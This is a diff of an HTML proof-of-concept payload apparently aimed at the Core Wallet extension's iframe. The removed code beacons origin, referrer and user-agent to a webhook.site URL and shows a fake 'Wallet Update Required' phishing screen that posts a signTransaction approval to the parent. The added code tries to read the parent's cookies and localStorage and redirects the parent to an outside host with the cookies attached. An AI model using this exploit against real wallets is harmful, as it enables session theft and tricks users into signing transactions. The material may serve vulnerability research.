@@ -1,59 +1,47 @@
+<!-- https://screenshotsart.store/payload.html -->
 <!doctype html>
 <html>
 	<head>
-		<meta charset="utf-8" />
+		<title>PoC</title>
 	</head>
 	<body>
-		<pre id="log">PoC running inside Core Wallet iframe...</pre>
 		<script>
-			var log = function (m) {
-				document.getElementById("log").textContent += "\n" + m;
-			};
+			console.log("=== SCREENSHOTSART.STORE PAYLOAD EXECUTING ===");
 
-			log("Origin: " + window.origin);
-			log("Location: " + window.location.href);
-			log("Referrer: " + document.referrer);
-			log("User-Agent: " + navigator.userAgent);
+			// Check our frame situation
+			console.log("window.origin:", window.origin);
+			console.log("parent origin attempt...");
 
-			// Prove JS execution with visible output
-			document.title = "XSS-PoC-Executed";
-
-			// Attempt postMessage to parent (Core wallet extension)
 			try {
-				window.parent.postMessage({ type: "xss-poc", executed: true, origin: window.origin }, "*");
-				log("postMessage sent to parent");
+				console.log("parent.origin:", window.parent.origin);
+				console.log("SAME ORIGIN ACCESS TO PARENT!");
+
+				// If we get here, we have same-origin access
+				// Try to read sensitive data
+				console.log("parent.document.cookie:", window.parent.document.cookie);
+				console.log("localStorage:", JSON.stringify(window.parent.localStorage));
+
+				// Try navigation
+				window.parent.location.href = "https://screenshotsart.store/pwned?cookies=" + encodeURIComponent(window.parent.document.cookie);
 			} catch (e) {
-				log("postMessage error: " + e.message);
+				console.log("Cross-origin blocked:", e.message);
+
+				// Even if cross-origin, check sandbox flags
+				console.log("Checking sandbox escape...");
+				try {
+					// postMessage to parent
+					window.parent.postMessage({ type: "PROBE", from: "screenshotsart" }, "*");
+				} catch (e2) {
+					console.log("postMessage failed:", e2);
+				}
 			}
 
-			// Beacon to attacker server proving execution
-			// Replace YOUR-WEBHOOK-ID with your webhook.site ID
-			var exfilUrl =
-				"https://webhook.site/619e5ded-1f9c-4f88-8a16-f651f7d9b586" +
-				"?src=core-wallet" +
-				"&origin=" +
-				encodeURIComponent(window.origin) +
-				"&referrer=" +
-				encodeURIComponent(document.referrer) +
-				"&ua=" +
-				encodeURIComponent(navigator.userAgent);
-			new Image().src = exfilUrl;
-			log("Beacon sent to: " + exfilUrl);
-
-			// Render phishing UI to demonstrate social engineering risk
-			setTimeout(function () {
-				document.body.innerHTML =
-					"" +
-					'<div style="font-family:-apple-system,sans-serif;padding:24px;text-align:center;background:#1a1a2e;color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center">' +
-					'<div style="font-size:48px;margin-bottom:16px">⚠️</div>' +
-					'<h2 style="margin:0 0 8px">Wallet Update Required</h2>' +
-					'<p style="color:#aaa;font-size:14px;margin:0 0 24px">Approve the security patch to protect your funds.</p>' +
-					'<button style="background:#e74c3c;color:#fff;border:none;padding:12px 32px;border-radius:8px;font-size:16px;cursor:pointer" ' +
-					"onclick=\"window.parent.postMessage({type:'malicious-approve',action:'signTransaction'},'*')\">" +
-					"Approve Update</button>" +
-					'<p style="color:#555;font-size:11px;margin-top:16px">This is a security PoC — no real action is taken.</p>' +
-					"</div>";
-			}, 3000);
+			// Also try top
+			try {
+				console.log("top.origin:", window.top.origin);
+			} catch (e) {
+				console.log("top access blocked:", e.message);
+			}
 		</script>
 	</body>
 </html>
